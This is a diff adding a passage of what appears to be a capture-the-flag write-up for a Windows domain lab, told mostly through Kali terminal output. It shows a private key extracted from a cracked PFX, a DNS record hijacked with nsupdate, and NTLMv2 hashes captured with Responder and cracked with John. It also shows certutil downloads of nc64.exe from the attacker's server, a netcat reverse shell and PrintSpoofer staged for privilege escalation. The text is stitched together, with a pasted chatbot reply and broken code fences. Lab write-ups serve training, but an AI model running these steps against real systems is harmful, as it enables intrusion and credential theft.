@@ -1290,3 +1290,649 @@ Session completed.
 
 ganteng
 
+OpenSSL is a free, open-source, software library that provides cryptographic functionality, including secure communication over networks using the Secure Sockets Layer (SSL) and Transport Layer Security (TLS) protocols. It is widely used to implement the underlying security for a variety of applications and protocols, such as HTTPS (Hypertext Transfer Protocol Secure), SSH (Secure Shell), and SSL/TLS VPNs (Virtual Private Networks).
+
+OpenSSL is written in the C programming language and is available for a wide range of platforms, including Windows, Linux, and macOS. It provides a variety of cryptographic algorithms, including symmetric ciphers (e.g., AES and Blowfish), public-key algorithms (e.g., RSA and Elliptic Curve Cryptography), and hashing algorithms (e.g., SHA and MD5).
+
+In addition to providing cryptographic functionality, OpenSSL also includes a number of command-line tools that can be used to perform various tasks, such as creating and managing SSL/TLS certificates, converting certificate formats, and debugging SSL/TLS connections.
+
+I hope this helps! Let me know if you have any other questions.
+```
+```text
+┌──(kali㉿kali)-[~/ra2]
+└─$ openssl -h                 
+help:
+
+Standard commands
+asn1parse         ca                ciphers           cmp               
+cms               crl               crl2pkcs7         dgst              
+dhparam           dsa               dsaparam          ec                
+ecparam           enc               engine            errstr            
+fipsinstall       gendsa            genpkey           genrsa            
+help              info              kdf               list              
+mac               nseq              ocsp              passwd            
+pkcs12            pkcs7             pkcs8             pkey              
+pkeyparam         pkeyutl           prime             rand              
+rehash            req               rsa               rsautl            
+s_client          s_server          s_time            sess_id           
+smime             speed             spkac             srp               
+storeutl          ts                verify            version           
+x509              
+
+Message Digest commands (see the `dgst' command for more details)
+blake2b512        blake2s256        md4               md5               
+rmd160            sha1              sha224            sha256            
+sha3-224          sha3-256          sha3-384          sha3-512          
+sha384            sha512            sha512-224        sha512-256        
+shake128          shake256          sm3               
+
+Cipher commands (see the `enc' command for more details)
+aes-128-cbc       aes-128-ecb       aes-192-cbc       aes-192-ecb       
+aes-256-cbc       aes-256-ecb       aria-128-cbc      aria-128-cfb      
+aria-128-cfb1     aria-128-cfb8     aria-128-ctr      aria-128-ecb      
+aria-128-ofb      aria-192-cbc      aria-192-cfb      aria-192-cfb1     
+aria-192-cfb8     aria-192-ctr      aria-192-ecb      aria-192-ofb      
+aria-256-cbc      aria-256-cfb      aria-256-cfb1     aria-256-cfb8     
+aria-256-ctr      aria-256-ecb      aria-256-ofb      base64            
+bf                bf-cbc            bf-cfb            bf-ecb            
+bf-ofb            camellia-128-cbc  camellia-128-ecb  camellia-192-cbc  
+camellia-192-ecb  camellia-256-cbc  camellia-256-ecb  cast              
+cast-cbc          cast5-cbc         cast5-cfb         cast5-ecb         
+cast5-ofb         des               des-cbc           des-cfb           
+des-ecb           des-ede           des-ede-cbc       des-ede-cfb       
+des-ede-ofb       des-ede3          des-ede3-cbc      des-ede3-cfb      
+des-ede3-ofb      des-ofb           des3              desx              
+rc2               rc2-40-cbc        rc2-64-cbc        rc2-cbc           
+rc2-cfb           rc2-ecb           rc2-ofb           rc4               
+rc4-40            seed              seed-cbc          seed-cfb          
+seed-ecb          seed-ofb          sm4-cbc           sm4-cfb           
+sm4-ctr           sm4-ecb           sm4-ofb
+```
+```text
+┌──(kali㉿kali)-[~/ra2]
+└─$ openssl pkcs12 -in cert.pfx 
+Enter Import Password:
+Bag Attributes
+    Microsoft Local Key set: <No Values>
+    localKeyID: 01 00 00 00 
+    friendlyName: te-4b942170-a078-48b3-80cb-e73333376b73
+    Microsoft CSP Name: Microsoft Software Key Storage Provider
+Key Attributes
+    X509v3 Key Usage: 90 
+Enter PEM pass phrase:
+Verifying - Enter PEM pass phrase:
+-----BEGIN ENCRYPTED PRIVATE KEY-----
+MIIFLTBXBgkqhkiG9w0BBQ0wSjApBgkqhkiG9w0BBQwwHAQITyoMybcH0yMCAggA
+MAwGCCqGSIb3DQIJBQAwHQYJYIZIAWUDBAEqBBAtRQXPmSg3rr9xHAwRDglPBIIE
+0Nor4hr2/QiOwXhWV4/Sd6HhTrzFCbcZVWHjKS5k+5SYnsOdcDz4yd8kykPJq1i1
+wT9jmD6Svd1SCaip6gDOXnqhKmTR4Ubc+FYPmednSdXBim5RuageTZIq7J3F31JW
+PXnT6ZmjE7SR//7FWd6pUvHQ/uO1FGnDL/WK8JDmdweohhhjzj/TSzgZbAVo5NNk
+gllwD9Ph3Gxwrx7FGkOeqYGlDpcWRTnTkY1huTrg3p9ATJVR44pOezHifbXKvIcg
+q5Lo1SgZem85RFHyBez65hz1YXzZg+VsoSHLScR/BRBumVasMpNq2lsrvB2tcXC+
+vUAwPDg/JPkqn5ihlIpsfqyhyQp4+9kTv5XOqqXNlWB3GoHIoRN/N5JFdhshbhjX
+jZ8V3h7kOvrWHgHxm2ozZC0MWVx5+6RJpqZLnw9xuuGKPmNdPZePrZv+Yb+QCUvy
+5w0tIMWL4vSJ4wASdG+HhCi7GTx9a9TVbBHMpgvgRiiEid8qb2ifdzwyNO2oQBNw
+3nYI8GjlDhnZ+JQBeYF+Em05ohi8zymjvmhhG8o4Il9nS9xl2lk2zJNgADJ/qELq
+cHrNIsDoYG5j6ddUx6UPVL2V/XC7pqcwfmSnjqL0HqHdWMd+MbfajjsEMSdFq2cf
+sGNVo187cYFN+8QUs6gT/BLNMZIgOGJAr5k1EG7GbcQtbHOooxbUOTCOjSeRzImf
+TBFNpcbF2kljaFWSMdAypHsJsMR4BbTqv8riq+thcSg2m5H60mjPTds+9+EUoEoM
+1YZNw1ID4eRPPNtlKFwHoGWLQBEJLy3sSVjOF2N1FIkhZEeSM0wwdHHi67bQ3zUE
+gkc6fb1olGGGhEtdAZgYD8xJvq3rtHz5b0RCcMukjnE0CbMyPay2pVKlCh88RB7s
+Qq4MhroF1YmzgKOkRD+Jp7IJ7nVbbxzrjsfe0AkA/jjU2GmiU83XrX0pr3hOrGuH
+qFM4ffa8sJQnRGYlZHKLxB2C1F6MjoWEyxpJpckn7NmRKV32TVPh59HV3Tvx/ssG
+aPAp8ANQ59pUWnSYnw83lGdJRJQOU6p36bcX8b7KLs0oKWlWZDEA3uxYipZ5mwcW
+6kSkcqqOIJUMdhwEiIvYU5QGTIonKVWUE5cQ8NMhPIX9ehbk/Bf7iqX/sFNClTCa
+ug6ow4NsL9pCUNZKSFlo7fLuqPiDbS0YhO5yBrduUJpNrdVH0SHYM2nziJMK8/VD
++plILrhrVZYl14mhuCD40gbZYdSkzkjIORo72bAnPdrzV4wFKl/BhwU9smOhv5O/
+/Yk5pgphqUlepyulDfeuDSF3e9fePpqUNB6qh/bf/9oSjNbUvVFt8UKoV0HQMGJl
+YXwh7g9uf8Cgn+EgQKyoFSYrdlgTJPj92FbAIZoQ6aBHJ9yXmGDucLhISJpfobFF
+JzeNYAaPcT7fc4uyh09S+W17NNfn8O5d1ZsR+kxbWpJM9X0vOLPGJCLmP79kESgX
+1H2cu9ittv2zKl92oS2YH8KDvEFysFp6oBaNX8/YyQtSWtB5M0/vZXqseguOPppn
+1bFkYmoVbLch1vjeoLsJCOf5VWX3K/7ZR5pLAIHOtkNcvC27wtt9WqPF20jyJfj3
+vP6VSKYn4lGINY818S/a8J1lzb31zXxB7/Qa6UguQSdn
+-----END ENCRYPTED PRIVATE KEY-----
+Bag Attributes
+    localKeyID: 01 00 00 00 
+subject=CN = fire.windcorp.thm
+issuer=CN = fire.windcorp.thm
+-----BEGIN CERTIFICATE-----
+MIIDajCCAlKgAwIBAgIQUI2QvXTCj7RCVdv6XlGMvjANBgkqhkiG9w0BAQsFADAc
+MRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTAeFw0yMDA1MjkwMzMxMDhaFw0y
+ODA1MjkwMzQxMDNaMBwxGjAYBgNVBAMMEWZpcmUud2luZGNvcnAudGhtMIIBIjAN
+BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAv900af0f6n80F0J6U9jMgcwQrozr
+kXmi02esW1XAsHpWnuuMQDIN6AtiYmDcoFEXz/NteLI7T6PusqQ6SXqLBurTnR8V
+InPD3Qea6lxOXNjuNeqqZKHhUaXiwSaqtAB+GzPkNtevw3jeEj99ST/G1qwY9Xce
+sfeqR2J4kQ+8U5yKLJDPBxOSx3+SHjKErrLTk66lrlEi4atr+P/ccXA5TBkZFkYh
+i3YdKTDnYeP2fMrqvOqpw82eniHAGJ2N8JJbNep86ps8giIRieBUUclF/WCp4c33
+p4i1ioVxJIYJj6f0tjGhy9GxB7l69OtUutcIG0/FhxL2dQ86MmnHH0dE7QIDAQAB
+o4GnMIGkMA4GA1UdDwEB/wQEAwIFoDAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYB
+BQUHAwEwVAYDVR0RBE0wS4IRZmlyZS53aW5kY29ycC50aG2CGHNlbGZzZXJ2aWNl
+LndpbmRjb3JwLnRobYIcc2VsZnNlcnZpY2UuZGV2LndpbmRjb3JwLnRobTAdBgNV
+HQ4EFgQUIZvYlCIhAOFLRutycf6U2H6LhqIwDQYJKoZIhvcNAQELBQADggEBAKVC
+ZS6HOuSODERi/glj3rPJaHCStxHPEg69txOIDaM9fX4WBfmSjn+EzlrHLdeRS22h
+nTPirvuT+5nn6xbUrq9J6RCTZJD+uFc9wZl7Viw3hJcWbsO8DTQAshuZ5YJ574pG
+HjyoVDOfYhy8/8ThvYf1H8/OaIpG4UIo0vY9qeBQBOPZdbdVjWNerkFmXVq+MMVf
+pAt+FffQE/48kTCppuSKeM5ZMgHP1/zhZqyJ3npljVDlgppjvh1loSYB+reMkhwK
+2gpGJNwxLyFDhTMLaj0pzFL9okqs5ovEWEj8p96hEE6Xxl4ZApv6mxTs9j2oY6+P
+MTUqFyYKchFUeYlgf7k=
+-----END CERTIFICATE-----
+
+Now we can create a public and private key with openssl using `cert.pfx` and the password we cracked with john.
+
+We need to extract the contents of the pfx to a certificate-file and a key-file.
+```
+```text
+┌──(kali㉿kali)-[~/ra2]
+└─$ openssl pkcs12 -in cert.pfx -nocerts -out key.pem -nodes
+Enter Import Password:
+```
+```text
+┌──(kali㉿kali)-[~/ra2]
+└─$ ls
+cert.pfx  hash  key.pem  PrintSpoofer.exe
+```
+```text
+┌──(kali㉿kali)-[~/ra2]
+└─$ openssl pkcs12 -in cert.pfx -out crt.pem -clcerts -nokeys
+Enter Import Password:
+```
+```text
+┌──(kali㉿kali)-[~/ra2]
+└─$ ls
+cert.pfx  crt.pem  hash  key.pem  PrintSpoofer.exe
+
+──(kali㉿kali)-[~/ra2]
+└─$ more crt.pem 
+Bag Attributes
+    localKeyID: 01 00 00 00 
+subject=CN = fire.windcorp.thm
+issuer=CN = fire.windcorp.thm
+-----BEGIN CERTIFICATE-----
+MIIDajCCAlKgAwIBAgIQUI2QvXTCj7RCVdv6XlGMvjANBgkqhkiG9w0BAQsFADAc
+MRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTAeFw0yMDA1MjkwMzMxMDhaFw0y
+ODA1MjkwMzQxMDNaMBwxGjAYBgNVBAMMEWZpcmUud2luZGNvcnAudGhtMIIBIjAN
+BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAv900af0f6n80F0J6U9jMgcwQrozr
+kXmi02esW1XAsHpWnuuMQDIN6AtiYmDcoFEXz/NteLI7T6PusqQ6SXqLBurTnR8V
+InPD3Qea6lxOXNjuNeqqZKHhUaXiwSaqtAB+GzPkNtevw3jeEj99ST/G1qwY9Xce
+sfeqR2J4kQ+8U5yKLJDPBxOSx3+SHjKErrLTk66lrlEi4atr+P/ccXA5TBkZFkYh
+i3YdKTDnYeP2fMrqvOqpw82eniHAGJ2N8JJbNep86ps8giIRieBUUclF/WCp4c33
+p4i1ioVxJIYJj6f0tjGhy9GxB7l69OtUutcIG0/FhxL2dQ86MmnHH0dE7QIDAQAB
+o4GnMIGkMA4GA1UdDwEB/wQEAwIFoDAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYB
+BQUHAwEwVAYDVR0RBE0wS4IRZmlyZS53aW5kY29ycC50aG2CGHNlbGZzZXJ2aWNl
+LndpbmRjb3JwLnRobYIcc2VsZnNlcnZpY2UuZGV2LndpbmRjb3JwLnRobTAdBgNV
+HQ4EFgQUIZvYlCIhAOFLRutycf6U2H6LhqIwDQYJKoZIhvcNAQELBQADggEBAKVC
+ZS6HOuSODERi/glj3rPJaHCStxHPEg69txOIDaM9fX4WBfmSjn+EzlrHLdeRS22h
+nTPirvuT+5nn6xbUrq9J6RCTZJD+uFc9wZl7Viw3hJcWbsO8DTQAshuZ5YJ574pG
+HjyoVDOfYhy8/8ThvYf1H8/OaIpG4UIo0vY9qeBQBOPZdbdVjWNerkFmXVq+MMVf
+pAt+FffQE/48kTCppuSKeM5ZMgHP1/zhZqyJ3npljVDlgppjvh1loSYB+reMkhwK
+2gpGJNwxLyFDhTMLaj0pzFL9okqs5ovEWEj8p96hEE6Xxl4ZApv6mxTs9j2oY6+P
+MTUqFyYKchFUeYlgf7k=
+-----END CERTIFICATE-----
+```
+```text
+┌──(kali㉿kali)-[~/ra2]
+└─$ more key.pem 
+Bag Attributes
+    Microsoft Local Key set: <No Values>
+    localKeyID: 01 00 00 00 
+    friendlyName: te-4b942170-a078-48b3-80cb-e73333376b73
+    Microsoft CSP Name: Microsoft Software Key Storage Provider
+Key Attributes
+    X509v3 Key Usage: 90 
+-----BEGIN PRIVATE KEY-----
+MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC/3TRp/R/qfzQX
+QnpT2MyBzBCujOuReaLTZ6xbVcCwelae64xAMg3oC2JiYNygURfP8214sjtPo+6y
+pDpJeosG6tOdHxUic8PdB5rqXE5c2O416qpkoeFRpeLBJqq0AH4bM+Q216/DeN4S
+P31JP8bWrBj1dx6x96pHYniRD7xTnIoskM8HE5LHf5IeMoSustOTrqWuUSLhq2v4
+/9xxcDlMGRkWRiGLdh0pMOdh4/Z8yuq86qnDzZ6eIcAYnY3wkls16nzqmzyCIhGJ
+4FRRyUX9YKnhzfeniLWKhXEkhgmPp/S2MaHL0bEHuXr061S61wgbT8WHEvZ1Dzoy
+accfR0TtAgMBAAECggEBAJNKtlpHwKC9VrgkiNSlsxpSFtxpws7DmoTBKkhT5MGW
+qbkHC3yc8KAbXUQ5KCbLGoTCVGA8M9xH9Y+fFEAkm2aMEDinDAqO5OZiWENi6aXN
+w9IQfQ8UV23e891kWdgmKKmphKG1o3Fk8NcBdqUtGPDk3aRT9nSZtVdn+Tcj5Wgp
+iHiwGnWtjZV2C4VS5J/PBdWyXNHB3qsJUiGUnOYkrCQJgTOllau5mp9S7DNbz/IY
+ziMBjv4VkHJyt8rSBRV1lzN4Ypo+tVeO6MOfwbse6kAqjOx0VJz3ktpG6VQfTFs1
+UtkPvys9yQAb8EcTn2cDLnLzkodZq4jxFqgdm2SvvOECgYEA4N79nnYWsojfBtuO
+k6MUuMI1afgyzp6erWtSo//PCy/uTiUL6KLUS0l4u0Qoq2GbSHPmqCQJEcvjieAb
+IGsnr+D1mX5Z9Kq9Q4uk274QCNXNt0k7M7+//rQxNJVw8LLXsZVqBR2OEWczAm/D
+d/14eApAVk9ChPXDmlkGcDOHP5MCgYEA2myCMwUfNxiMbiNtTeHLQnuKzjD50E8O
+4B8A4Qi45mxUSUR6NJZUCgC0KksJjd/qEPIHSxmotvOv7tW/XXxTXJnfuya49VbS
+lkteFaWXGZUMeEeP3qSENPnGZgXb+/LTsQByK0I0im4Qv0B3AKEGXaQzwcutgL+r
+NEHRZAQ9OX8CgYApP/6aMONdAMqYwXHYF1RXyBhwRf1b9bD58vQH7YcXcEVwxE74
+79Wtsd6Zy5kCRzdrBQfM1D9tqk8lHZ0cR0vScZvb+leaEDAD0fv961GZrU69Touz
+pHsdyAQ2tysunEAA7X2zToafHqU2zzW2LyMIMik3K/bx2Pt2ttn9fxZSTQKBgE22
+L3ihiOKcXFJPTnNYM24a8F699BOWHS/GOBTYepiY0EAlGemd1pace31UpziQAwI2
+ajvhDDLTbrPl3qkPM8WNhZlbhJDdbB1HAVloSeMzMXWV2G0ZUWRbvafMy+DPG1wt
+UXFso67gzBqPgAd8QvyMEFIR+lAFYY89H5ebHoFXAoGBAMZwew71UsZ9PVZ2xcxW
+iIt7OSxbx4VnrDr3HCZ5NjVYdJrjDAFZrEA84/Mo1aXH/K4Fpq1lmTNIfQxPacG2
+FRIKyIa9JdSaVUI1pBP5w6bsVOC4WiL1EQU3+2ImdFPm9ZRf1Y1uPuUzxe8EeebI
+y+tQYYpi8HTqt2yzZ01n6C+0
+-----END PRIVATE KEY-----
+```
+```text
+┌──(kali㉿kali)-[~/ra2]
+└─$ sudo cp crt.pem /usr/share/responder/certs 
+[sudo] password for kali:
+```
+```text
+┌──(kali㉿kali)-[~/ra2]
+└─$ sudo cp key.pem /usr/share/responder/certs
+```
+```text
+┌──(kali㉿kali)-[~/ra2]
+└─$ ls /usr/share/responder/certs
+crt.pem  gen-self-signed-cert.sh  key.pem  responder.crt  responder.key
+```
+```text
+┌──(kali㉿kali)-[~/ra2]
+└─$ tail /usr/share/responder/Responder.conf 
+
+; HTML answer to inject in HTTP responses (before </body> tag).
+; leave empty if you want to use the default one (redirect to SMB on your IP address).
+HTMLToInject =
+
+[HTTPS Server]
+
+; Configure SSL Certificates to use
+SSLCert = certs/crt.pem
+SSLKey = certs/key.pem
+
+Let’s send a request to delete the existing A record for `selfservice.windcorp.thm` and then send an update add request for a new A record to have selfservice resolve to our THM IP.
+
+nsupdate is a command-line utility that allows you to submit Dynamic DNS Update requests to a DNS server. It is typically used to update resource records in the Domain Name System (DNS) in real-time, without the need to manually edit zone files or wait for DNS propagation.
+
+nsupdate uses the DNS Update protocol, which is defined in RFC 2136 and allows clients to add, delete, or modify DNS resource records. It is often used in conjunction with the Internet Security Association and Key Management Protocol (ISAKMP) and the Oakley Key Determination Protocol (OKDP) to provide secure dynamic updates.
+```
+```text
+┌──(kali㉿kali)-[~/ra2]
+└─$ nsupdate 
+> server 10.10.85.102
+> update delete selfservice.windcorp.thm
+> send
+> update add selfservice.windcorp.thm 1234 A 10.8.19.103
+> send
+> quit
+```
+```text
+┌──(kali㉿kali)-[~/ra2]
+└─$ dig selfservice.windcorp.thm @10.10.85.102
+
+; <<>> DiG 9.18.8-1-Debian <<>> selfservice.windcorp.thm @10.10.85.102
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 20708
+;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4000
+;; QUESTION SECTION:
+;selfservice.windcorp.thm.      IN      A
+
+;; ANSWER SECTION:
+selfservice.windcorp.thm. 1234  IN      A       10.8.19.103
+
+;; Query time: 212 msec
+;; SERVER: 10.10.85.102#53(10.10.85.102) (UDP)
+;; WHEN: Thu Dec 22 17:45:44 EST 2022
+;; MSG SIZE  rcvd: 69
+```
+```text
+┌──(kali㉿kali)-[~/ra2]
+└─$ sudo responder -I tun0
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.3.0
+
+  To support this project:
+  Patreon -> https://www.patreon.com/PythonResponder
+  Paypal  -> https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.8.19.103]
+    Responder IPv6             [fe80::103f:dc24:521e:1b71]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP']
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-9MHM78H1GWT]
+    Responder Domain Name      [5NB7.LOCAL]
+    Responder DCE-RPC Port     [48422]
+
+[+] Listening for events...                                                                               
+
+[HTTP] NTLMv2 Client   : 10.10.85.102
+[HTTP] NTLMv2 Username : WINDCORP\edwardle
+[HTTP] NTLMv2 Hash     : edwardle::WINDCORP:41da90a415b80f32:7360F3E899DBEF61CE7F63812CC0D42F:01010000000000004B76EA465716D90116D7FA67C9A5BB01000000000200080035004E004200370001001E00570049004E002D0039004D0048004D0037003800480031004700570054000400140035004E00420037002E004C004F00430041004C0003003400570049004E002D0039004D0048004D0037003800480031004700570054002E0035004E00420037002E004C004F00430041004C000500140035004E00420037002E004C004F00430041004C000800300030000000000000000100000000200000EEC918F04E2D96CFE643EE96DECD6484D5B891BEA2022ED0E4C2BEC0DD8C75A20A00100012C690EF73A24A276DC3EDC54B8CC48409003A0048005400540050002F00730065006C00660073006500720076006900630065002E00770069006E00640063006F00720070002E00740068006D000000000000000000        
+[SMB] NTLMv2-SSP Client   : 10.10.85.102
+[SMB] NTLMv2-SSP Username : WINDCORP\edwardle
+[SMB] NTLMv2-SSP Hash     : edwardle::WINDCORP:93a9d84a81f920e8:E11743A082BE174976EB58F54475B33F:01010000000000008027164C2D16D90122CB25F9ABAC9D3B000000000200080035004E004200370001001E00570049004E002D0039004D0048004D00370038004800310047005700540004003400570049004E002D0039004D0048004D0037003800480031004700570054002E0035004E00420037002E004C004F00430041004C000300140035004E00420037002E004C004F00430041004C000500140035004E00420037002E004C004F00430041004C00070008008027164C2D16D90106000400020000000800300030000000000000000100000000200000EEC918F04E2D96CFE643EE96DECD6484D5B891BEA2022ED0E4C2BEC0DD8C75A20A001000000000000000000000000000000000000900200063006900660073002F00310030002E0038002E00310039002E003100300033000000000000000000                 
+[*] Skipping previously captured hash for WINDCORP\edwardle
+[*] Skipping previously captured hash for WINDCORP\edwardle
+[*] Skipping previously captured hash for WINDCORP\edwardle
+[*] Skipping previously captured hash for WINDCORP\edwardle
+[*] Skipping previously captured hash for WINDCORP\edwardle
+[*] Skipping previously captured hash for WINDCORP\edwardle
+[*] Skipping previously captured hash for WINDCORP\edwardle
+```
+```text
+┌──(kali㉿kali)-[~/ra2]
+└─$ nano user_hash
+```
+```text
+┌──(kali㉿kali)-[~/ra2]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt user_hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+!Angelus25!      (edwardle)     
+1g 0:00:00:18 DONE (2022-12-22 17:49) 0.05552g/s 796343p/s 796343c/s 796343C/s !SkicA!..!)(^karabatak55
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed.
+```
+```text
+┌──(kali㉿kali)-[~/ra2]
+└─$ more user_hash 
+edwardle::WINDCORP:93a9d84a81f920e8:E11743A082BE174976EB58F54475B33F:01010000000000008027164C2D16D90122CB2
+5F9ABAC9D3B000000000200080035004E004200370001001E00570049004E002D0039004D0048004D0037003800480031004700570
+0540004003400570049004E002D0039004D0048004D0037003800480031004700570054002E0035004E00420037002E004C004F004
+30041004C000300140035004E00420037002E004C004F00430041004C000500140035004E00420037002E004C004F00430041004C0
+0070008008027164C2D16D90106000400020000000800300030000000000000000100000000200000EEC918F04E2D96CFE643EE96D
+ECD6484D5B891BEA2022ED0E4C2BEC0DD8C75A20A001000000000000000000000000000000000000900200063006900660073002F0
+0310030002E0038002E00310039002E003100300033000000000000000000
+
+https://fire.windcorp.thm/powershell
+
+edwardle:!Angelus25!
+fire.windcorp.thm
+
+Revshell
+```
+```text
+┌──(kali㉿kali)-[~/ra2]
+└─$ locate nc.exe            
+/home/kali/Downloads/steel_mountain/nc.exe
+/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
+/usr/share/windows-resources/binaries/nc.exe
+```
+```text
+┌──(kali㉿kali)-[~/ra2]
+└─$ cp /home/kali/Downloads/steel_mountain/nc.exe nc.exe
+```
+```text
+┌──(kali㉿kali)-[~/ra2]
+└─$ ls           
+cert.pfx  crt.pem  hash  key.pem  nc.exe  PrintSpoofer.exe  user_hash
+```
+```text
+┌──(kali㉿kali)-[~/ra2]
+└─$ python3 -m http.server 1337
+Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
+
+Windows PowerShell
+Copyright (C) 2016 Microsoft Corporation. All rights reserved.
+PS C:\Users\edwardle.WINDCORP\Documents> 
+whoami
+windcorp\edwardle
+PS C:\Users\edwardle.WINDCORP\Documents> 
+certutil.exe -urlcache -f http://10.8.19.103:1337/nc.exe nc.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+PS C:\Users\edwardle.WINDCORP\Documents>
+```
+```text
+┌──(kali㉿kali)-[~/ra2]
+└─$ python3 -m http.server 1337
+Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
+10.10.85.102 - - [22/Dec/2022 17:57:47] "GET /nc.exe HTTP/1.1" 200 -
+10.10.85.102 - - [22/Dec/2022 17:57:48] "GET /nc.exe HTTP/1.1" 200 -
+```
+```text
+┌──(kali㉿kali)-[~/ra2]
+└─$ rlwrap nc -lnvp 1337
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::1337
+Ncat: Listening on 0.0.0.0:1337
+
+uhmm not work so using nc64.exe
+```
+```text
+┌──(kali㉿kali)-[~/ra2]
+└─$ cp /home/kali/hackthebox/nc64.exe nc64.exe
+```
+```text
+┌──(kali㉿kali)-[~/ra2]
+└─$ ls
+cert.pfx  crt.pem  hash  key.pem  nc64.exe  nc.exe  PrintSpoofer.exe  user_hash
+```
+```text
+┌──(kali㉿kali)-[~/ra2]
+└─$ python3 -m http.server 1337               
+Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
+10.10.85.102 - - [22/Dec/2022 18:06:49] "GET /nc64.exe HTTP/1.1" 200 -
+10.10.85.102 - - [22/Dec/2022 18:06:50] "GET /nc64.exe HTTP/1.1" 200 -
+
+PS C:\Users\edwardle.WINDCORP\Desktop>
+certutil.exe -urlcache -f http://10.8.19.103:1337/nc64.exe nc64.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+PS C:\Users\edwardle.WINDCORP\Desktop>
+.\nc64.exe -e cmd.exe 10.8.19.103 9001
+```
+```text
+┌──(kali㉿kali)-[~/ra2]
+└─$ rlwrap nc -lnvp 9001
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::9001
+Ncat: Listening on 0.0.0.0:9001
+Ncat: Connection from 10.10.85.102.
+Ncat: Connection from 10.10.85.102:56903.
+Microsoft Windows [Version 10.0.17763.1158]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\edwardle.WINDCORP\Desktop>whoami
+whoami
+windcorp\edwardle
+
+C:\Users\edwardle.WINDCORP\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 84E1-0562
+
+ Directory of C:\Users\edwardle.WINDCORP\Desktop
+
+12/22/2022  03:06 PM    <DIR>          .
+12/22/2022  03:06 PM    <DIR>          ..
+05/31/2020  09:12 AM                47 Flag 2.txt
+12/22/2022  03:04 PM           138,017 nc.exe
+12/22/2022  03:06 PM            45,272 nc64.exe
+               3 File(s)        183,336 bytes
+               2 Dir(s)  43,868,139,520 bytes free
+
+C:\Users\edwardle.WINDCORP\Desktop>type 'Flag 2.txt'
+type 'Flag 2.txt'
+The system cannot find the file specified.
+Error occurred while processing: 'Flag.
+The system cannot find the file specified.
+Error occurred while processing: 2.txt'.
+C:\Users\edwardle.WINDCORP\Desktop>type "Flag 2.txt"
+type "Flag 2.txt"
+THM{8a1d460dfe345f8edd09d45ae00e5c1c14d12c89}
+
+it works!
+
+Privesc
+
+C:\Users\edwardle.WINDCORP\Desktop>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State  
+============================= ========================================= =======
+SeMachineAccountPrivilege     Add workstations to domain                Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
+
+ SeImpersonatePrivilege potential attack vector :) using printSpoofer
+```
+```text
+┌──(kali㉿kali)-[~/ra2]
+└─$ ls
+cert.pfx  crt.pem  hash  key.pem  nc64.exe  nc.exe  PrintSpoofer.exe  user_hash
+```
+```text
+┌──(kali㉿kali)-[~/ra2]
+└─$ python3 -m http.server 1337               
+Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
+10.10.85.102 - - [22/Dec/2022 18:06:49] "GET /nc64.exe HTTP/1.1" 200 -
+10.10.85.102 - - [22/Dec/2022 18:06:50] "GET /nc64.exe HTTP/1.1" 200 -
+10.10.85.102 - - [22/Dec/2022 18:14:19] "GET /PrintSpoofer.exe HTTP/1.1" 200 -
